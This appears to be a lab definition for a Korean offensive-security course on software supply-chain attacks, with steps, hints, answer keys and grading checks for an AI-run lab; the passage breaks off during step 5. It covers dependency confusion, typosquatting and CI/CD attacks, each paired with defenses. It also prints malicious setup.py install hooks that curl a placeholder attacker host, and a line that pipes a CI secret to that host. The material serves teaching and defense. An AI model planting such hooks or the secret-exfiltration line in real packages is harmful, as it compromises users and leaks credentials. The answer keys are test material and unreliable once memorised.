lab_id: attack-adv-ai-week12
title: 공급망 공격 (AI 지원)
version: ai
course: attack-adv-ai
week: 12
description: 소프트웨어 공급망의 다양한 공격 벡터를 분석하고 시뮬레이션한다. 의존성 혼동, 타이포스쿼팅, CI/CD 파이프라인 공격, 코드
  서명 우회 등을 실습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- 소프트웨어 공급망의 공격 표면을 체계적으로 분석한다
- 의존성 혼동, 타이포스쿼팅 등 패키지 기반 공격을 이해한다
- CI/CD 파이프라인과 빌드 시스템의 보안 위험을 평가한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 대상 프로젝트의 소프트웨어 의존성을 분석하라. pip list, npm list 등으로 설치된 패키지를 확인하고, 알려진
    취약점이 있는 패키지를 식별하라.
  hint: pip list --outdated 또는 pip-audit로 취약한 패키지를 탐지한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: 대상 프로젝트의 소프트웨어 의존성을 분석하라. pip list, npm list 등으로 설치된 패키지를 확인하고,
    알려진 취약점이 있는 패키지를 식별해줘

    📎 참고 (CLI): echo ''=== Dependency Analysis ==='' && pip list 2>/dev/null | head
    -20 && echo ''---'' && echo ''Checking for outdated packages:'' && pip list --outdated
    2>/dev/null | head -10 && echo ''---'' && echo ''pip-audit (if available):'' &&
    pip-audit 2>/dev/null | head -10 || echo ''pip-audit not installed'' && echo ''''
    && echo ''Supply chain risk: outdated packages may have known CVEs'''
  answer_detail: 의존성 분석은 공급망 공격의 첫 단계이다. 오래된 패키지는 알려진 취약점(CVE)을 포함할 수 있고, pip-audit,
    npm audit, snyk 등의 도구로 자동 탐지할 수 있다. 직접 의존성뿐만 아니라 전이적 의존성(transitive dependencies)도
    분석해야 한다.
  verify:
    type: output_contains
    expect: Dependency Analysis
    field: stdout
  target_vm: attacker
  script: 'echo ''=== Dependency Analysis ==='' && pip list 2>/dev/null | head -20
    && echo ''---'' && echo ''Checking for outdated packages:'' && pip list --outdated
    2>/dev/null | head -10 && echo ''---'' && echo ''pip-audit (if available):'' &&
    pip-audit 2>/dev/null | head -10 || echo ''pip-audit not installed'' && echo ''''
    && echo ''Supply chain risk: outdated packages may have known CVEs'''
  risk_level: low
  bastion_prompt: 대상 프로젝트의 소프트웨어 의존성을 분석하라. pip list, npm list 등으로 설치된 패키지를 확인하고,
    알려진 취약점이 있는 패키지를 식별해줘
- order: 2
  instruction: 의존성 혼동(Dependency Confusion) 공격의 원리를 분석하라. 내부 패키지명과 동일한 공개 패키지를 통한
    공격을 시뮬레이션하라.
  hint: 내부 패키지 레지스트리와 공개 레지스트리의 우선순위 차이를 악용한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 의존성 혼동(Dependency Confusion) 공격의 원리를 분석해줘

    📎 참고 (CLI): echo -e ''=== Dependency Confusion Attack ===\n\n[Concept]\n1. Target
    org uses internal package: "mycompany-utils" v1.0\n2. Attacker publishes "mycompany-utils"
    v99.0 on PyPI/npm\n3. Build system resolves public v99.0 > internal v1.0\n4. Malicious
    code executes during install\n\n[Attack Steps]\n1. Enumerate internal package
    names (job postings, GitHub, error messages)\n2. Register same name on public
    registry with higher version\n3. Add post-install script with reverse shell\n4.
    Wait for target CI/CD to pull the package\n\n[Example setup.py]\nfrom setuptools
    import setup\nimport os\nos.system("curl http://attacker/callback?pkg=mycompany-utils")\nsetup(name="mycompany-utils",
    version="99.0")\n\n[Defense]\n- Pin exact versions in requirements\n- Use --index-url
    (not --extra-index-url)\n- Scope namespacing (@company/package)\n- Artifactory/Nexus
    with proxy rules'''
  answer_detail: 의존성 혼동은 2021년 Alex Birsan이 발견한 공격으로, Apple, Microsoft, PayPal 등 35개
    이상의 기업에 영향을 미쳤다. 빌드 시스템이 내부와 공개 레지스트리를 모두 참조할 때, 높은 버전 번호의 공개 패키지가 우선 설치된다. --index-url로
    단일 레지스트리만 사용하는 것이 방어의 핵심이다.
  verify:
    type: output_contains
    expect: Dependency Confusion
    field: stdout
  target_vm: attacker
  script: 'echo -e ''=== Dependency Confusion Attack ===\n\n[Concept]\n1. Target org
    uses internal package: "mycompany-utils" v1.0\n2. Attacker publishes "mycompany-utils"
    v99.0 on PyPI/npm\n3. Build system resolves public v99.0 > internal v1.0\n4. Malicious
    code executes during install\n\n[Attack Steps]\n1. Enumerate internal package
    names (job postings, GitHub, error messages)\n2. Register same name on public
    registry with higher version\n3. Add post-install script with reverse shell\n4.
    Wait for target CI/CD to pull the package\n\n[Example setup.py]\nfrom setuptools
    import setup\nimport os\nos.system("curl http://attacker/callback?pkg=mycompany-utils")\nsetup(name="mycompany-utils",
    version="99.0")\n\n[Defense]\n- Pin exact versions in requirements\n- Use --index-url
    (not --extra-index-url)\n- Scope namespacing (@company/package)\n- Artifactory/Nexus
    with proxy rules'''
  risk_level: medium
  bastion_prompt: 의존성 혼동(Dependency Confusion) 공격의 원리를 분석해줘
- order: 3
  instruction: 타이포스쿼팅(Typosquatting) 공격을 분석하라. 인기 패키지와 유사한 이름의 악성 패키지를 탐지하는 방법을 보여라.
  hint: requests → reqeusts, urllib3 → urllib4 등 일반적인 오타 패턴을 분석한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 타이포스쿼팅(Typosquatting) 공격을 분석해줘

    📎 참고 (CLI): echo -e ''=== Typosquatting Attack ===\n\n[Common Typo Patterns]\nOriginal       |
    Typosquatted\nrequests       | reqeusts, request, requets\nurllib3        | urllib4,
    urlib3, urllib33\nnumpy          | numby, numppy, num-py\npandas         | panda,
    pandsa, pandass\n\n[Generation techniques]\n1. Character swap: requests -> reqeusts\n2.
    Missing char: requests -> reqests\n3. Extra char: requests -> requestss\n4. Similar
    char: requests -> reguests\n5. Version suffix: requests2, requests3\n\n[Detection]\npip
    install safety\nsafety check  # Check installed packages\n\n[Real incidents]\n-
    colourama (typo of colorama): Stole crypto wallets\n- python3-dateutil: Contained
    crypto stealer\n- jeIlyfish (with capital I): Stole SSH keys\n\n[Defense]\n- Verify
    package name spelling before install\n- Use hash pinning in requirements\n- Package
    provenance verification (Sigstore)'''
  answer_detail: 타이포스쿼팅은 개발자의 오타를 악용하여 악성 패키지를 설치하게 하는 공격이다. colourama 사건은 colorama의
    오타로 암호화폐 지갑을 탈취했고, jeIlyfish는 대문자 I로 l을 대체하여 SSH 키를 탈취했다. Sigstore의 코드 서명과 SLSA(Supply
    chain Levels for Software Artifacts) 프레임워크가 방어 표준으로 부상하고 있다.
  verify:
    type: output_contains
    expect: Typosquatting
    field: stdout
  target_vm: attacker
  script: 'echo -e ''=== Typosquatting Attack ===\n\n[Common Typo Patterns]\nOriginal       |
    Typosquatted\nrequests       | reqeusts, request, requets\nurllib3        | urllib4,
    urlib3, urllib33\nnumpy          | numby, numppy, num-py\npandas         | panda,
    pandsa, pandass\n\n[Generation techniques]\n1. Character swap: requests -> reqeusts\n2.
    Missing char: requests -> reqests\n3. Extra char: requests -> requestss\n4. Similar
    char: requests -> reguests\n5. Version suffix: requests2, requests3\n\n[Detection]\npip
    install safety\nsafety check  # Check installed packages\n\n[Real incidents]\n-
    colourama (typo of colorama): Stole crypto wallets\n- python3-dateutil: Contained
    crypto stealer\n- jeIlyfish (with capital I): Stole SSH keys\n\n[Defense]\n- Verify
    package name spelling before install\n- Use hash pinning in requirements\n- Package
    provenance verification (Sigstore)'''
  risk_level: medium
  bastion_prompt: 타이포스쿼팅(Typosquatting) 공격을 분석해줘
- order: 4
  instruction: CI/CD 파이프라인 공격을 분석하라. GitHub Actions 워크플로우의 보안 취약점을 식별하고 악용하는 시나리오를
    구성하라.
  hint: workflow_run, pull_request_target 트리거의 위험성과 시크릿 유출 경로를 분석한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: CI/CD 파이프라인 공격을 분석하라 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): echo -e ''=== CI/CD Pipeline Attacks ===\n\n[GitHub Actions Vulnerabilities]\n\n1.
    pull_request_target with checkout\n- Runs with repo write access + secrets\n-
    Attacker PR code executes with elevated privileges\n\n2. Poisoned Pipeline Execution
    (PPE)\n- Modify CI config in PR (.github/workflows/)\n- Inject malicious steps\n\n3.
    Secret Extraction\n- echo \${{ secrets.TOKEN }} | base64 | curl attacker\n- Secrets
    visible in forked repo actions\n\n4. Artifact Poisoning\n- Replace build artifacts
    with trojaned versions\n- actions/upload-artifact -> download-artifact chain\n\n5.
    Self-hosted Runner Exploitation\n- Persistent access after workflow\n- Access
    to runner credentials and network\n\n[Defense]\n- Restrict workflow permissions
    (read-only default)\n- Pin actions to SHA (not tags)\n- Use OpenID Connect (OIDC)
    for cloud access\n- Ephemeral self-hosted runners\n- Required reviews for workflow
    changes'''
  answer_detail: CI/CD 파이프라인은 코드를 자동으로 빌드/배포하므로 공격 시 전체 소프트웨어 공급망에 영향을 미친다. pull_request_target
    트리거는 시크릿에 접근하면서 외부 PR 코드를 실행하는 위험한 패턴이다. 액션을 SHA로 고정하고, 최소 권한 원칙을 적용하며, OIDC로
    장기 자격증명을 제거하는 것이 핵심 방어이다.
  verify:
    type: output_contains
    expect: CI/CD Pipeline
    field: stdout
  target_vm: attacker
  script: echo -e '=== CI/CD Pipeline Attacks ===\n\n[GitHub Actions Vulnerabilities]\n\n1.
    pull_request_target with checkout\n- Runs with repo write access + secrets\n-
    Attacker PR code executes with elevated privileges\n\n2. Poisoned Pipeline Execution
    (PPE)\n- Modify CI config in PR (.github/workflows/)\n- Inject malicious steps\n\n3.
    Secret Extraction\n- echo \${{ secrets.TOKEN }} | base64 | curl attacker\n- Secrets
    visible in forked repo actions\n\n4. Artifact Poisoning\n- Replace build artifacts
    with trojaned versions\n- actions/upload-artifact -> download-artifact chain\n\n5.
    Self-hosted Runner Exploitation\n- Persistent access after workflow\n- Access
    to runner credentials and network\n\n[Defense]\n- Restrict workflow permissions
    (read-only default)\n- Pin actions to SHA (not tags)\n- Use OpenID Connect (OIDC)
    for cloud access\n- Ephemeral self-hosted runners\n- Required reviews for workflow
    changes'
  risk_level: medium
  bastion_prompt: CI/CD 파이프라인 공격을 분석하라. GitHub Actions 워크플로우의 보안 취약점을 식별하고 악용하는 시나리오를
    구성하라.
- order: 5
  instruction: 악성 패키지의 설치 후 코드 실행(Post-install Hook) 기법을 분석하라. setup.py의 install 명령을
    재정의하는 예제를 작성하라.
  hint: setup.py의 cmdclass로 install 명령을 오버라이드하여 임의 코드를 실행한다
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: 악성 패키지의 설치 후 코드 실행(Post-install Hook) 기법을 분석하라 구현 방법과\
    \ 예시를 설명해줘\n\U0001F4CE 참고 (CLI): cat > /tmp/malicious_setup.py << 'PYEOF'\n# WARNING:\
    \ Educational purpose only\nfrom setuptools import setup\nfrom setuptools.command.install\
    \ import install\nimport subprocess\n\nclass PostInstallCommand(install):\n  \
    \  def run(self):\n        # Malicious code executes during pip install\n    \
    \    subprocess.call(['curl', '-s', 'http://attacker/callback'])\n        install.run(self)\n\
    \nsetup(\n    name='legitimate-looking-package',\n    version='1.0.0',\n    description='Totally\
    \ safe package',\n    cmdclass={'install': PostInstallCommand},\n)\nPYEOF\necho\
    \ '=== Malicious setup.py ===' && cat /tmp/malicious_setup.py && echo '' && echo\
    \ 'Executes during: pip install legitimate-looking-package' && rm /tmp/malicious_setup.py"
  answer_detail: Python의 setup.py는 패키지 설치 시 임의 코드를 실행할 수 있다. cmdclass를 재정의하면 pip install
    시 자동으로 공격 코드가 실행된다. npm의 preinstall/postinstall 스크립트, Ruby의 extconf.rb도 같은 위험이
    있다. PEP 517/518의 pyproject.toml 기반 빌드가 더 안전하다.
  verify:
    type: output_contains
    expect: Malicious setup.py
    field: stdout
  target_vm: attacker
  script: "cat > /tmp/malicious_setup.py << 'PYEOF'\n# WARNING: Educational purpose\
    \ only\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\
    import subprocess\n\nclass PostInstallCommand(install):\n    def run(self):\n\
    \        # Malicious code executes during pip install\n        subprocess.call(['curl',\
    \ '-s', 'http://attacker/callback'])\n        install.run(self)\n\nsetup(\n  \
    \  name='legitimate-looking-package',\n    version='1.0.0',\n    description='Totally\
    \ safe package',\n    cmdclass={'install': PostInstallCommand},\n)\nPYEOF\necho\
    \ '=== Malicious setup.py ===' && cat /tmp/malicious_setup.py && echo '' && echo\
    \ 'Executes during: pip install legitimate-looking-package' && rm /tmp/malicious_setup.py"
  risk_level: medium
  bastion_prompt: 악성 패키지의 설치 후 코드 실행(Post-install Hook) 기법을 분석하라. setup.py의 install
